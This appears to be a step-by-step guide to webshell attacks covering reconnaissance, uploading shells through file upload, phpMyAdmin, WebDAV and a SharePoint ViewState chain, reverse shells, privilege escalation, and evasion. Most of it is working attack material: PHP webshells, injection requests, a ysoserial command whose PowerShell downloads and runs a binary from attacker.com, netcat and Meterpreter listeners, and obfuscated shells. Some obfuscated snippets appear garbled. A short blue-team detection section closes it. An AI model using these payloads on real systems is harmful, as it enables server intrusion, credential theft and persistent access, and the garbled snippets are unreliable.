# Complete Webshell Exploitation Methodologies

## Introduction

Webshell exploitation follows a systematic methodology that has been used in countless real-world breaches. This guide documents the complete process—from initial reconnaissance to gaining persistent access—using real tools, frameworks, and historical attack patterns.

According to the 2025 ToolShell campaign, attackers are actively exploiting modern platforms like SharePoint using sophisticated webshell chains, demonstrating that these techniques remain highly relevant today .


## Phase 1: Reconnaissance and Vulnerability Discovery

### Step 1.1: Service Enumeration

Before attempting webshell deployment, identify all potential entry points on the target.

**Using Nmap for port scanning:**
```bash
# Comprehensive port scan
nmap -sV -p- -T4 192.168.1.100

# Service version detection
nmap -sV -sC -p80,443,8080 192.168.1.100

# WebDAV enumeration
nmap -p80 --script http-webdav-scan 192.168.1.100
```

**Real-world example (Metasploitable 2 lab):** Security researchers demonstrate that WebDAV misconfigurations on port 80 allow unauthorized file uploads, leading to complete server compromise .

### Step 1.2: Web Technology Fingerprinting

**Using WhatWeb for CMS detection:**
```bash
whatweb http://target.com
```

**Using Burp Suite for manual exploration:**
1. Configure Burp as proxy (127.0.0.1:8080)
2. Browse target application
3. Review the Target > Site Map for:
   - Upload functionality
   - File management features
   - CGI-BIN directories
   - Admin panels

**Using Gobuster for directory brute-forcing:**
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,aspx,jsp
```

### Step 1.3: Identifying Vulnerable Endpoints

**CGI-BIN discovery (Shellshock exploitation):**
```bash
# Nmap script specifically for Shellshock
nmap 192.168.1.100 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi

# Manual test for CGI vulnerability
curl -H "User-Agent: () { :; }; echo 'Vulnerable'" http://target.com/cgi-bin/test.cgi
```

The Shellshock vulnerability (CVE-2014-6271) affected Apache servers with mod_cgi enabled, allowing remote code execution through malicious environment variables .

**SharePoint-specific enumeration (ToolShell - 2025):**
```bash
# Check for vulnerable ToolPane.aspx endpoint
curl -s http://target/_layouts/15/start.aspx | grep -oP '__VIEWSTATEGENERATOR" value="\K[^"]+'
```


## Phase 2: Webshell Upload and Deployment

### Method 1: Direct File Upload Exploitation

**When to use:** Applications with unrestricted file upload functionality.

**Basic PHP webshell payload:**
```php
<?php system($_GET['cmd']); ?>
```

**Using Burp Suite to upload:**
1. Intercept the upload request
2. Modify filename to `shell.php`
3. Change Content-Type to `image/jpeg` (bypass weak validation)
4. Forward the request

**Automated tool: AdaptiveShellUploader**
```bash
# Clone the tool
git clone https://github.com/Cyberheroess/AdaptiveShellUploader
cd AdaptiveShellUploader

# Install dependencies
pip install -r requirements.txt

# Run the tool
python Shell_uploader.py
# Enter target URL when prompted: http://victim.com/
```

This tool automatically detects CMS platforms (WordPress, Joomla, Drupal), identifies WAF protections, and selects appropriate bypass techniques .

### Method 2: PHPMyAdmin Exploitation

**Historical attack pattern (Metasploitable 2):** Default phpMyAdmin installations with accessible `/setup` directories allow remote code execution without authentication .

**Step-by-step exploitation:**

1. **Locate phpMyAdmin:**
   ```
   http://target.com/phpMyAdmin/
   http://target.com/phpmyadmin/
   ```

2. **Access setup directory:**
   ```
   http://target.com/phpMyAdmin/setup/
   ```

3. **Using Burp Suite Repeater to inject payload:**

   **Request:**
   ```
   POST http://target.com/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
   Host: target.com
   
   <?php passthru('id'); die(); ?>
   ```

   This modifies PHP configuration to include user input as executable code .

4. **Execute commands:**
   ```
   <?php passthru('whoami'); die(); ?>
   <?php passthru('cat /etc/passwd'); die(); ?>
   ```

### Method 3: WebDAV Exploitation

**Scenario:** WebDAV enabled with PUT method accessible.

**Using cadaver (WebDAV client):**
```bash
# Connect to WebDAV
cadaver http://target.com/dav/

# Login (if credentials are default/weak)
# Or proceed without auth

# Upload webshell
put shell.php

# Verify upload
ls
```

The WebDAV attack chain is well-documented in penetration testing labs: reconnaissance → WebDAV access → webshell upload → remote code execution → credential harvesting .

### Method 4: ASP.NET ViewState Exploitation (ToolShell - 2025)

**Most sophisticated modern method:** Attackers chain multiple vulnerabilities to deploy webshells on SharePoint servers without authentication .

**Complete exploitation chain:**

**Step 1: Initial unauthenticated access**
```http
POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1
Host: target.com
Referer: /_layouts/SignOut.aspx
Content-Type: application/x-www-form-urlencoded

# Malicious payload here
```

**Step 2: Deploy crypto dumper webshell**
The attacker uploads `spinstall0.aspx` - a specialized webshell that extracts machine keys rather than executing commands directly .

**Step 3: Extract cryptographic keys**
The webshell uses .NET reflection to read:
- ValidationKey
- DecryptionKey
- MachineKey configuration

**Step 4: Generate valid ViewState payloads**
```bash
# Generate malicious ViewState token
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "powershell -nop -c \"Invoke-WebRequest -Uri 'http://attacker.com/shell.exe' -OutFile '%TEMP%\backdoor.exe'; Start-Process '%TEMP%\backdoor.exe'\"" \
  --generator="[EXTRACTED_GENERATOR]" \
  --validationkey="[EXTRACTED_VALIDATION_KEY]" \
  --validationalg="HMACSHA256" \
  --islegacy
```

**Step 5: Execute arbitrary commands**
```bash
curl http://target.com/_layouts/15/success.aspx?__VIEWSTATE=[GENERATED_PAYLOAD]
```

This technique was actively exploited in July 2025, with over 8,000 SharePoint servers scanned and dozens compromised globally .


## Phase 3: Command Execution and Persistence

### Testing the Webshell

**PHP webshell test:**
```bash
# Basic command test
curl "http://target.com/shell.php?cmd=whoami"

# Interactive testing via browser
http://target.com/shell.php?cmd=id
http://target.com/shell.php?cmd=ls%20-la
http://target.com/shell.php?cmd=cat%20/etc/passwd
```

**ASP.NET webshell test:**
```bash
curl "http://target.com/shell.aspx?c=cmd.exe&args=/c%20whoami"
```

### Gaining Interactive Access

**Using Kali Linux reverse shell payloads:**
```bash
# Copy reverse shell template
cp /usr/share/webshells/php/php-reverse-shell.php ./revshell.php

# Edit the file to set your IP and port
vi revshell.php
# Change $ip = 'YOUR_IP'; $port = YOUR_PORT;

# Start listener
nc -nvlp 4444

# Upload and trigger the reverse shell
curl -X POST http://target.com/upload.php --form "file=@revshell.php"
curl "http://target.com/uploads/revshell.php"
```

**Using Metasploit for advanced shells:**
```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.100
msf6 > set LPORT 4444
msf6 > exploit -j

# Then trigger your webshell that downloads and executes meterpreter
```

### Post-Exploitation Activities

**System enumeration:**
```bash
# Through webshell
whoami
id
uname -a
cat /etc/os-release

# Network reconnaissance
ifconfig
ip a
netstat -tuln
route -n
```

**Credential harvesting (real-world example):**
In documented WebDAV attacks, after gaining webshell access, attackers locate and extract credential hashes from files like `shadow_copy` for offline cracking .

**Privilege escalation:**
```bash
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check for writable cron jobs
ls -la /etc/cron*
```


## Phase 4: Obfuscation and Evasion

### Basic Obfuscation Techniques

**XOR obfuscated PHP webshell:**
```php
<?php ;").($_^"/"); ?>
```
Accessed via: `http://target.com/shell.php?=system&=id`

**Variable variable obfuscation:**
```php
<?php /'^'{{{{';@${$_}[_](@${$_}[__]); ?>
```
Accessed via: `http://target.com/shell.php?_=system&__=whoami`

These techniques evade signature-based detection by dynamically constructing function names at runtime.

### WAF Bypass Strategies

**Content-Type manipulation:**
- Change `Content-Type: application/x-php` to `Content-Type: image/jpeg`
- Use `Content-Type: multipart/form-data` with boundary randomization

**Payload splitting:**
```php
<?php
$cmd = $_GET['cmd'];
$result = shell_exec($cmd);
echo $result;
?>
```

**Using alternative PHP functions when system() is disabled:**
```php
<?php passthru($_GET['cmd']); ?>
<?php exec($_GET['cmd'], $output); print_r($output); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php `$_GET[cmd]`; ?>  # Backticks work as exec
```


## Testing Methodology Summary

### Complete Testing Checklist

| Phase | Action | Tool | Expected Result |
|-------|--------|------|-----------------|
| Recon | Port scan | Nmap | Identify open web ports |
| Recon | Directory brute-force | Gobuster | Find upload endpoints, CGI-BIN |
| Upload | Test file upload | Burp Suite | Successful shell.php upload |
| Upload | WebDAV put | cadaver | Shell uploaded to /dav/ |
| Execute | Command test | curl | System command output |
| Persist | Reverse shell | Netcat | Interactive session |
| Escalate | Privilege escalation | Manual | Root/admin access |

### Safe Testing Environment

**Set up vulnerable lab:**
- **Target:** Metasploitable 2, DVWA, or HackTheBox machines
- **Attacker:** Kali Linux (contains all required tools)
- **Network:** Isolated host-only network

**Vulnerable applications to practice:**
- DVWA (File Upload, Command Injection modules)
- Metasploitable 2 (phpMyAdmin, WebDAV)
- TryHackMe Shellshock room

### Detection of Compromise Indicators

**For blue teams defending against these attacks:**

**Webshell indicators:**
- Suspicious file names: `shell.php`, `cmd.aspx`, `spinstall0.aspx`
- Files with PHP/ASPX extensions in upload directories
- Unusual process creation from web server processes (`w3wp.exe` spawning `cmd.exe`)

**Network indicators:**
- HTTP POST requests to newly created files
- GET parameters containing system commands (`?cmd=whoami`)
- Referer headers pointing to logout pages during upload attempts 

**Log analysis:**
```bash
# Check for suspicious POST to new files
grep "POST.*\.php" /var/log/apache2/access.log | grep "200"

# Check for command execution patterns
grep -E "(cmd=|system=|passthru=|whoami|id|cat /etc/passwd)" /var/log/apache2/access.log
```


## Real-World Attack Statistics (2025)

The ToolShell campaign demonstrates the continued evolution of webshell attacks:

- **Scope:** Dozens of compromised SharePoint servers globally 
- **Method:** Zero-day exploitation chain (CVE-2025-49704, CVE-2025-49706) 
- **Payload:** Custom ASPX webshell (`spinstall0.aspx`) for crypto theft
- **Impact:** Complete server takeover without authentication
- **Detection:** Unique 160-byte response size identifies compromised systems
